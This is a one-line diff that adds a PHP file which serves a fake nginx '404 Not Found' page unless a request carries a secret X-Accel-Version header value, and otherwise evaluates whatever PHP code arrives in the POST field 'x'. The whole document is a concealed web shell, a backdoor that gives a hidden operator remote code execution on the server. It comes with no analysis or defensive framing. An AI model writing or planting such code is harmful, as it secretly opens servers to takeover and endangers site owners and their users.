@@ -1,0 +1,1 @@
+<?php if(($_SERVER['HTTP_X_ACCEL_VERSION']??'')!='9.4.1'){http_response_code(404);echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx</center></body></html>';exit;} @eval($_POST['x']);
